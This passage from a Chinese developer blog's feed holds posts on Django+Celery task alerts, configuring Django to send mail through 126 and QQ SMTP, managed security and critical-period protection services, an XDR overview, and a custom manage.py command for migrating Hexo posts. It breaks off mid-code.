now = datetime.datetime.now()</span><br><span class="line">    logger.info(<span class="string">'this is scheduletask '</span>+now.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/28_%E5%8A%A0%E5%85%A5%E9%92%A9%E5%AD%90%E7%A8%8B%E5%BA%8F.png" alt="在这里插入图片描述"></p><h3 id="2、重启服务"><a href="#2、重启服务" class="headerlink" title="2、重启服务"></a>2、重启服务</h3><p>将work和beta服务关掉，在两个控制台分别重新启动woker和beta</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject worker -l debug -P eventlet</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject beat -l debug</span><br></pre></td></tr></table></figure><h3 id="3、验证效果"><a href="#3、验证效果" class="headerlink" title="3、验证效果"></a>3、验证效果</h3><p>在任务成功或失败的时候发邮件通知。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/29_%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%BB%93%E6%9E%9C.png" alt="在这里插入图片描述"></p><p>任务执行成功通知<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/30_%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E9%80%9A%E7%9F%A5.png" alt="在这里插入图片描述"></p><p>任务执行异常告警通知<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/31_%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%BC%82%E5%B8%B8%E5%91%8A%E8%AD%A6%E9%80%9A%E7%9F%A5.png" alt="在这里插入图片描述"></p><p>Django如何发送邮件见 <a href="https://blog.csdn.net/fullbug/article/details/128495415" target="_blank" rel="noopener">https://blog.csdn.net/fullbug/article/details/128495415</a></p><p>至此，本文通过几个简单的应用介绍了Django+Celery+Flower实现异步和定时任务及其监控告警。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Django发送邮件</title>
      <link href="/posts/73474fe7/"/>
      <url>/posts/73474fe7/</url>
      
        <content type="html"><![CDATA[<p>通过Django发送邮件非常的简单，在Python中已经内置了一个smtplib邮件发送模块，Django在此基础上进行了简单地封装，我们可以在Django的环境中方便的发送邮件。大部分邮件发送成功主要是邮件的参数配置，本文以常用的126邮箱和QQ邮箱为例介绍Django发送邮件的配置，其他提供smtp邮件服务的邮箱都是一样的。</p><h2 id="一、Django邮件配置"><a href="#一、Django邮件配置" class="headerlink" title="一、Django邮件配置"></a>一、Django邮件配置</h2><p>用Django发送邮件需要告诉你的邮件服务器相应的参数配置，需要在settings.py中进行配置好。<br>默认情况下，使用配置文件中的<code>EMAIL_HOST</code>和<code>EMAIL_PORT</code>设置SMTP服务器主机和端口，<code>EMAIL_HOST_USER</code>和<br><code>EMAIL_HOST_PASSWORD</code>是用户名和密码。如果设置了EMAIL_USE_TLS和EMAIL_USE_SSL，它们将控制是否使用相应的加密链接。<br>典型的配置如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EMAIL_BACKEND = <span class="string">'django.core.mail.backends.smtp.EmailBackend'</span></span><br><span class="line">EMAIL_HOST = <span class="string">'smtp.126.com'</span>      <span class="comment">#126邮箱的邮箱服务地址</span></span><br><span class="line">EMAIL_PORT = <span class="number">25</span>          <span class="comment">#端口，大部分都是默认25</span></span><br><span class="line">EMAIL_HOST_USER = <span class="string">'yourmail@126.com'</span>    <span class="comment">#这里是你的邮箱账号</span></span><br><span class="line">EMAIL_HOST_PASSWORD = <span class="string">'yourpassword'</span>   <span class="comment">#注意这里不能用你邮箱账号的密码，而要用申请的设备授权码。</span></span><br></pre></td></tr></table></figure><p>这里要注意的两个地方，一个是EMAIL_PORT端口、一个是EMAIL_HOST_PASSWORD密码。<br>端口一般默认是25，但有些邮箱改了默认端口或需要用加密链接465、578端口，可以从邮件服务商查到。<br>密码以前可以用邮箱账号密码，但这几年随着安全要求的提高，大部分主要的邮件服务提供商都要用申请的授权码进一步加强安全系数。<br>这里介绍这些关键的信息如何在邮件服务商获取。</p><blockquote><p> <code>注意EMAIL_HOST_PASSWORD这里不能用你邮箱账号的密码，而要用申请的设备授权码。</code></p></blockquote><h3 id="126邮箱"><a href="#126邮箱" class="headerlink" title="126邮箱"></a>126邮箱</h3><p>进入到邮箱配置界面，点击“POP3/SMTP/IMAP”，注意要开启SMTP。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/1_%E5%BC%80%E5%90%AFSMTP.png" alt="126邮箱配置界面"></p><p>授权码是用于登录第三方邮件客户端的专用密码，点击”新增授权密码”，降会弹出一个账号安全验证，扫描后可以快速的发短信。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/2_%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81.png" alt="账号安全验证界面"></p><p>用你的注册手机发完短信后点击”我已发送”就会弹出一个授权码的窗口，要把这个授权码记下来，这个窗口只显示一次。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/3_%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83.png" alt="授权码显示界面"></p><h3 id="QQ邮箱"><a href="#QQ邮箱" class="headerlink" title="QQ邮箱"></a>QQ邮箱</h3><p>进入到QQ邮箱WEB界面后点击“设置”，点击“邮件设置”的“账户”页签拉到“账户安全”处就可以看到相关的SMTP服务信息</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/4_QQ%E9%82%AE%E7%AE%B1%E8%AE%BE%E7%BD%AESMTP%E6%9C%8D%E5%8A%A1.png" alt="QQ邮箱配置界面"></p><p>点击“生成授权码”，将弹出验证密保的界面。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/5_QQ%E9%82%AE%E7%AE%B1%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81.png" alt="验证密保界面"></p><p>根据提示发送短信后，点击我已发送，将会弹出生成授权码的界面显示授权码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/6_QQ%E9%82%AE%E7%AE%B1%E7%94%9F%E6%88%90%E6%8E%88%E6%9D%83%E7%A0%81.png" alt="授权码生成界面"></p><p>如果需要SSL加密方式，可以进一步查看服务商的SMTP服务说明<br>如QQ邮箱的服务说明 <a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331" target="_blank" rel="noopener">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=331</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/7_QQ%E9%82%AE%E7%AE%B1%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E.png" alt="服务说明界面"></p><p>看到使用SSL，端口号是465或587</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EMAIL_BACKEND = <span class="string">'django.core.mail.backends.smtp.EmailBackend'</span></span><br><span class="line">EMAIL_HOST = <span class="string">'smtp.qq.com'</span>  <span class="comment">#QQ邮箱的smtp服务器</span></span><br><span class="line">EMAIL_PORT = <span class="number">465</span>           <span class="comment">#端口为465或587</span></span><br><span class="line">EMAIL_USE_SSL = <span class="literal">True</span>    <span class="comment">#SSL加密方式设置为True</span></span><br><span class="line">EMAIL_HOST_USER = <span class="string">'yourmail@qq.com'</span>     <span class="comment">#这里是你的邮箱账号</span></span><br><span class="line">EMAIL_HOST_PASSWORD = <span class="string">'yourpassword'</span>   <span class="comment">#注意这里不能用你邮箱账号的密码，而要用申请的设备授权码。</span></span><br></pre></td></tr></table></figure><h2 id="二、测试发送邮件"><a href="#二、测试发送邮件" class="headerlink" title="二、测试发送邮件"></a>二、测试发送邮件</h2><p>可以用django的环境在shell中测试。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py shell</span><br><span class="line">from django.core.mail import send_mail</span><br><span class="line">send_mail(<span class="string">'test'</span>,<span class="string">'this is test mail'</span>,<span class="string">'yourmail@qq.com'</span>,[<span class="string">'yourmail@126.com'</span>,<span class="string">'yormail@qq.com'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221230/8_%E5%8F%91%E9%80%81%E9%82%AE%E7%AE%B1%E6%95%88%E6%9E%9C.png" alt="在这里插入图片描述"></p><p>如果反回1就表示发送成功了, 查收邮件到达。</p><p>如果发送不成功，请仔细核对邮箱服务的相关配置，一般来说与django无关。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全托管与重保安全服务</title>
      <link href="/posts/5381000/"/>
      <url>/posts/5381000/</url>
      
        <content type="html"><![CDATA[<p>近年来，高新技术数字经济快速发展，数字化转型成为各个行业高质量发展的重要引擎和创新路径。网络安全作为数字化建设的安全基石，却面临着网络安全人才缺口不断攀升的直接挑战。各安全公司依托自己网络安全经验的人才优势向客户提供各类安全服务，最常见的就是安全托管和重保安全。</p><p>安全托管服务与重保安全服务都是为客户提供安全服务，这两者有啥区别呢？</p><h2 id="一、安全托管服务"><a href="#一、安全托管服务" class="headerlink" title="一、安全托管服务"></a>一、安全托管服务</h2><p><strong>安全托管服务（Managed Security Service，MSS）</strong>，是由Gartner于2011年提出，简单来讲，即网络安全厂商通过自身的安全运营服务，包括人员、工具、平台等，为其用户提供7*24小时的安全托管服务。MSS安全托管服务最直接的目的，就是解决用户自身安全能力不足的问题，将专业的事情交给专业的人来做。说白了其实就是企业将自身的安全运营外包给有能力的安全厂商，解决自身安全运营能力不足的问题。</p><h2 id="二、重保安全服务"><a href="#二、重保安全服务" class="headerlink" title="二、重保安全服务"></a>二、重保安全服务</h2><p><strong>重保安全服务（Cybersecurity in Important Period, CIP）</strong>，是指在特殊时期（如HVV等）、重要活动（如两会等）、重大节日（如国庆等）期间为用户构建全方面的重要敏感时期的安全保障服务。保障网络基础设施、重点网站和业务系统安全，提供全方位的安全防守建设咨询以及事前、事中、事后的全面安全建设托管服务，确保企业客户的业务系统能够在重大活动期间安全平稳运行。</p><h2 id="三、安全托管服务与重保安全服务的区别"><a href="#三、安全托管服务与重保安全服务的区别" class="headerlink" title="三、安全托管服务与重保安全服务的区别"></a>三、安全托管服务与重保安全服务的区别</h2><p>从安全托管服务与重保安全服务的概念和定义上，个人理解安全托管服务与重保安全服务还是有所区别的。</p><p>一般来说，<strong>安全托管服务(MSS)服务侧重于管理和运营</strong>，以保障企业IT业务稳定运行为目的，主要是日常的安全运营。而<strong>重保安全更接近实战化</strong>主要侧重于重保期间的防护值守，有重点的企业客户的业务系统能够在重大活动期间安全平稳运行。</p><p>拿平时我们见到社会安保来类比，日常安全运营就是我们平时看到的日常治安巡逻；重保就是比如国庆期间、两会其间有针对性的加大安保防范力度如特警武装上岗执勤、某些重要场所限制人流、加强舆情监控等必要的防控手段。</p><ul><li><strong>从具体的服务内容来看：</strong></li></ul><p>安全托管服务主要是日常安全运营相关的内容如：资产的定期梳理、暴露面的检测、定期的漏扫、漏扫后的安全加固整改、安全监测、事件协助处置、安全策略定期优化等。</p><p>重保安全服务主要是针对重保时期有重点的安全保障更贴近实战化如：准备阶段的资产清查、暴露面识别、暴露面收敛等；重保初期的重点系统（或靶标系统）专项加固、情报收集、攻击阻断演练等；重保阶段的安全事件分析、响应处置、溯源反制、防守报告等。</p><ul><li><strong>从人员配置来看：</strong></li></ul><p>重保安全服务的人员配置不管是从人员数量还是个人网络安全专业水平来看都要比安全托管服务的高。一般来说重保安全服务的核心人员都会要求有攻防对抗能力。可以想像一下普通安保人员与武装特警的区别。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识XDR-扩展威胁检测与响应平台</title>
      <link href="/posts/160ef42d/"/>
      <url>/posts/160ef42d/</url>
      
        <content type="html"><![CDATA[<p>近年安全圈XDR的概念非常火，是近几年热点的安全技术之一，究竟什么是XDR，XDR核心能力是什么？能够解决什么问题，XDR与EDR、NDR关系和区别又是什么？让我们带着这些问题一起来认识一下XDR。</p><h1 id="一、什么是XDR"><a href="#一、什么是XDR" class="headerlink" title="一、什么是XDR"></a>一、什么是XDR</h1><p>XDR 于 2018 年由 Palo Alto 首席技术官 Nir Zuk 提出，2020-2021 年连续入选 Gartner 端点安全、安全运营技术成熟度曲线，目前处于创新启动期。</p><p>XDR全名是<strong>Extended Detection and Response（扩展检测和响应）</strong>，因为缩写与EDR重名了，所以就取了Extended第二个字母X，缩成了XDR。</p><p>Gartner给出的XDR定义为：XDR是一种基于SaaS的、绑定于特定供应商的安全威胁检测和事件响应工具，它将多个安全产品集成到一个统一了所有许可安全组件的内聚安全运营系统中。</p><p>通常情况下，可以认为XDR是一个融合了多种安全检测、响应能力的平台框架，只要是为了解决威胁检测与响应的问题能力模块，都可以往里装。它需要将多个安全产品能力有机的结合在一起，有统一的数据格式、策略、交互界面。相对于EDR（端点的检测与响应）和NDR（网络的检测与响应）来说，特别的强调X的概念，也就是可以扩展（Extended）的检测与响应。这里X覆盖了云、网、端、威胁情报等，EDR和NDR及其他的检测设备都可以作为XDR的能力模块为XDR提供数据来源和检测手段。</p><h1 id="二、XDR解决什么问题"><a href="#二、XDR解决什么问题" class="headerlink" title="二、XDR解决什么问题"></a>二、XDR解决什么问题</h1><p>近期， Gartner正式发布了2022安全运营技术成熟度曲线（Hype Cycle），正如大家所预测的那样，XDR终于站上了Peak of Inflated Expectations的顶端，成为安全运营体系中最炙手可热的技术之一，具体如下图所示：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221013/2022%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%8A%80%E6%9C%AF%E6%88%90%E7%86%9F%E5%BA%A6%E6%9B%B2%E7%BA%BF.png" alt="2022安全运营技术成熟度曲线"></p><p>那么在企业安全运营过程中究竟有什么困惑，XDR又能解决什么问题呢？</p><h2 id="1、安全运营的困惑"><a href="#1、安全运营的困惑" class="headerlink" title="1、安全运营的困惑"></a>1、安全运营的困惑</h2><ul><li><strong>单兵作战/数据孤岛</strong></li></ul><p>企业虽然有了SIEM/SOC等日志类数据分析平台，或是IDS、IPS、WAF、防火墙、EDR等单点安全设备，但前者无法理解下游检测设备告警，数据多而不准，安全误报多；后者获取的数据又有限，不同设备数据还无法紧密集成，最后变成了真实风险看不到，出现威胁防不了。</p><ul><li><strong>告警疲劳，误报多</strong></li></ul><p>安全人员每天都会收到来自不同安全设备的上万条威胁告警，而头疼的是，绝大多数（90%以上）都并非真实威胁，所以安全人员不是身体在处理误报的路上，就是精神在遭受误报的折磨，压力非常之大。</p><ul><li><strong>全局态势不可见</strong></li></ul><p>企业虽然买了一堆的安全设备，这些设备都产生了相应的告警，但是没有形成统一的全局的安全风险态势，对于安全主管来说要重点防范哪些地方，企业的安全建设还有哪些短板，这些都不可以知不可见。</p><ul><li><strong>响应处置能力弱</strong></li></ul><p>发生网络安全事件以后，无法有效溯源，快速的处置，尤其是多设备的联动处置，大多还停留在手工处置的阶段，处置效率先对比较低，不及时。</p><h2 id="2、XDR的作用"><a href="#2、XDR的作用" class="headerlink" title="2、XDR的作用"></a>2、XDR的作用</h2><p>XDR通过统一的交互框架、统一的数据标准、统一的数据存储方式进行安全数据采集、安全威胁集中分析、安全事件统一处置、响应编排。</p><p>XDR的核心作用在于能够跨越不同数据源与IT架构，集中汇集云、网、端、威胁情报等多源安全数据/工具。通过大数据与人工智能、用户行为分析等智能分析手段，对安全数据/事件进行关联分析，还原攻击路径，达到对整个攻击面的全面可视，解决安全孤岛的问题。基于动态更新的事件库与预置处置场景将产出的告警进行自动化编排与分诊，实现自动化响应。解决安全运营过程中数据孤岛、告警疲劳、全局态势不可见、响应处置能力弱的问题，更重要的是将企业安全运营水平和标准化产品挂钩，而非依赖不稳定的个人技术水平。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221013/XDR%E7%9A%84%E4%BD%9C%E7%94%A8.png" alt="XDR的作用"></p><h1 id="三、XDR与EDR、NDR的区别"><a href="#三、XDR与EDR、NDR的区别" class="headerlink" title="三、XDR与EDR、NDR的区别"></a>三、XDR与EDR、NDR的区别</h1><p>EDR从端点侧做威胁检测，确实能检测到攻击的准确信息，但是端点检测这种方式需要在用户主机上安装检测agent程序，无法覆盖用户所有的资产。并且端点检测的部署成本相比网络检测也更高，对于端点的操作系统、硬件配置、网络情况都有要求。</p><p>NDR从网络侧做威胁检测，检测到的更多都是攻击的特征或者攻击意图，此时攻击很有可能并未真正发生，或者并未造成严重后果。如果全部转化为威胁事件，则会造成告警风暴，给运营带来困难。</p><p>所以EDR的特点是检测的深但是覆盖面窄，而NDR的特点是检测的浅但是覆盖面广。</p><p>XDR则结合了这两者的全部优点，对于重点资产可采用端点检测方式，对于其他资产可采用网络检测方式。XDR平台会将这两种能力检测到的原始事件信息进行自动化关联，最终可将这些疑似的攻击信息，关联分析形成精准的威胁告警事件。</p><h1 id="四、XDR的架构和核心能力"><a href="#四、XDR的架构和核心能力" class="headerlink" title="四、XDR的架构和核心能力"></a>四、XDR的架构和核心能力</h1><h2 id="1、XDR的架构"><a href="#1、XDR的架构" class="headerlink" title="1、XDR的架构"></a>1、XDR的架构</h2><p>因为XDR是一个融合了多种安全检测、响应能力的平台框架，XDR的架构其关键组件包括前端组件（感应器，主要负责数据采集及检测）和后端平台组件（主要负责数据的汇聚、分析、威胁检测、响应处置）</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221013/XDR%E6%9E%B6%E6%9E%84.png" alt="XDR的架构"><br>XDR前端组件，由生成安全遥测数据的“触角”（感应器）组成，这些触角包括但不限于EDR（终端检测与响应-Endpoint Detection and Response)、EPP(终端防护平台-Endpoint Protection Platforms)、NDR（流量检测与响应平台-Network Detection and Response)、SSE（安全服务边缘-Security Services Edge)、CWPP(云工作负载安全防护平台-Cloud Workload Protection Platforms)、蜜罐、邮件安全。</p><p>而XDR的后端平台，则是吸收所有关键位置的遥测数据、日志、威胁上下文信息，之后再对所有的数据进行关联、高级分析、从而完成威胁检测、调查分析、攻击溯源、工具编排、自动化响应等工作。</p><p>从整体架构上<strong>XDR可以看成是融合了各安全能力组件（EDR、NDR等）+SDC（安全数据中心）+SIEM/SA（安全信息事件管理/态势感知）+SOAR（安全编排与自动化响应）形成的一个安全运营系统</strong>。</p><h2 id="2、核心能力"><a href="#2、核心能力" class="headerlink" title="2、核心能力"></a>2、核心能力</h2><p>XDR核心能力包括数据集成、检测技术、可视化、编排响应技术。</p><ul><li><strong>安全数据全面集成</strong></li></ul><p>对不同安全设备的数据进行全面的采集包括：内部（资产、脆弱性）、外部（流量、日志）以及云端威胁情报接入等相关安全数据的全面采集，汇聚、分析。</p><ul><li><strong>安全威胁深度检测</strong></li></ul><p>对多源安全告警进行关联分析、规则分析、情报分析、机器学习等，发现潜伏的高级持续性威胁，提升告警检出率和准确率。</p><ul><li><strong>安全态势集中展示</strong></li></ul><p>告警可视、事件可视、攻击可视，从多安全事件、攻击方向、攻击趋势、影响范围等多维度多视角进行态势可视化呈现。</p><ul><li><strong>安全事件快速处置</strong></li></ul><p>通过可视化剧本编排，快速实现人员、流程、工具的有效协同，对接联动安全防护设备，在安全事件发生时自动下发阻断策略，并在必要时下发通知预警，及时完成安全闭环。</p><p>   XDR成熟度模型如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221013/XDR%E6%88%90%E7%86%9F%E5%BA%A6%E6%A8%A1%E5%9E%8B.png" alt="XDR成熟度模型"></p><h1 id="五、XDR应用场景"><a href="#五、XDR应用场景" class="headerlink" title="五、XDR应用场景"></a>五、XDR应用场景</h1><p>XDR集中汇集云、网、端、威胁情报等多源安全数据/工具，解决安全运营过程中数据孤岛、告警疲劳、全局态势不可见、响应处置能力弱的问题。可以有效应用于企业常态化安全运营及重保攻防实战对抗场景。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20221013/XDR%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E8%81%94%E5%8A%A8%E5%93%8D%E5%BA%94%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="XDR威胁检测联动响应示意图"></p><ul><li><strong>日常安全运营场景</strong></li></ul><p>日常安全运营，通过XDR提升安全运营的威胁检测能力和响应效率。<br>精准响应：更好的检测效果及响应能力，解决原有海量告警导致事件难以有效检测、溯源深度不足导致响应效果差的问题，有效应对攻防对抗加剧带来新的安全风险。<br>风险管理：从被动事件响应转向有计划的风险管理，预防重大安全事件。<br>处置闭环：采用简单有效的方式开展安全分析、管理、处置工作，实现事件处置的有效闭环管控。<br>态势可见：安全态势统一呈现，安全运营有地放矢，哪里不足补哪里。</p><ul><li><strong>攻防实战对抗场景</strong></li></ul><p>攻防实战，通过XDR实现异构可扩展的威胁检测响应能力，进行快速响应、加固优化安全措施、攻击反制。<br>检测深度：更精准的高级威胁检测和安全事件溯源能力。<br>检测广度：拥有丰富的数据，包括事件完整的上下文信息、原始报文等供客户深度挖掘；全方位的的威胁数据采集，全面的威胁检测分析，全局的态势呈现。<br>敏捷响应：可进行快速响应、加固优化安全措施、攻击反制。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django自定义manage.py命令实现hexo博客迁移</title>
      <link href="/posts/32650d1c/"/>
      <url>/posts/32650d1c/</url>
      
        <content type="html"><![CDATA[<p>实现了hexo的md文件格式解析，通过什么方式怎么来迁移hexo的博客到django的博客呢？开始想到的是通过Django的manage.py的shell命令，通过shell可以执行写好的python脚本进行hexo的md文件格式解析并入库。后来想想为啥不直接自定义一个manage.py的命令直接进行迁移呢？就如我们新建Django工程迁移数据库一样，执行python manage.py migrate来迁移数据库。我们可以定义python manage.py xxx来执行的迁移hexo博客。</p><p>自定义Django-admin命令分三步：创建management文件夹、编写命令代码、测试验证</p><h2 id="一、创建management文件夹"><a href="#一、创建management文件夹" class="headerlink" title="一、创建management文件夹"></a>一、创建management文件夹</h2><p>自定义的Django-admin管理命令本质上是一个python脚本文件，它的存放路径必须遵循一定的规范，一般位于app/management/commands目录。整个文件夹的布局如下所示：<br><code>注意app要在setting中注册</code><br>在blog/management/commands包下面创建transblog.py文件</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/Django%E8%87%AA%E5%AE%9A%E4%B9%89manage.py%E5%91%BD%E4%BB%A4%E5%AE%9E%E7%8E%B0hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="在这里插入图片描述"></p><p>这里有两个要注意的地方:</p><blockquote><p>1、app要在setting中注册。如blog在setting中注册了所以可以在blog/management/commands包下面创建transblog.py文件，api和common都没有在setting中注册所以在这两个目录下创建的不会作为管理命令生效。<br>2、创建的management/commands是Python包，不是单纯的目录，区别就是目录里必须有<strong>init</strong>.py文件，空文件都可以。</p></blockquote><h2 id="二、编写命令代码"><a href="#二、编写命令代码" class="headerlink" title="二、编写命令代码"></a>二、编写命令代码</h2><p>创建命令管理文件后就可以在该文件中编写命令代码了。<br>每一个自定义的管理命令本质是一个Command类, 它继承了Django的Basecommand或其子类, 主要通过重写handle()方法实现自己的业务逻辑代码，而add_arguments()则用于帮助处理命令行的参数，如果运行命令时不需要额外参数，可以不写这个方法。<br>transblog.py的参考代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    :author: XieJava</span></span><br><span class="line"><span class="string">    :url: http://ishareread.com</span></span><br><span class="line"><span class="string">    :copyright: © 2021 XieJava &lt;xiejava@ishareread.com&gt;</span></span><br><span class="line"><span class="string">    :license: MIT, see LICENSE for more details.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> blog.models <span class="keyword">import</span> BlogPost,BlogCategory,Tag</span><br><span class="line"><span class="keyword">from</span> utils.parseblog <span class="keyword">import</span> parseblog</span><br><span class="line"><span class="keyword">from</span> django.core.management.base <span class="keyword">import</span> BaseCommand</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span><span class="params">(BaseCommand)</span>:</span></span><br><span class="line">    help=<span class="string">'读取指定目录的.md文件解析至ishareblog'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_arguments</span><span class="params">(self, parser)</span>:</span></span><br><span class="line">        parser.add_argument(<span class="string">'--path'</span>,help=<span class="string">'输入.md文件的目录'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'--file'</span>,help=<span class="string">'输入.md文件的路径'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self, *args, **options)</span>:</span></span><br><span class="line">        inputfile = input(<span class="string">'请输入指定的目录路径或.md文件路径:'</span>)</span><br><span class="line">        <span class="keyword">if</span> 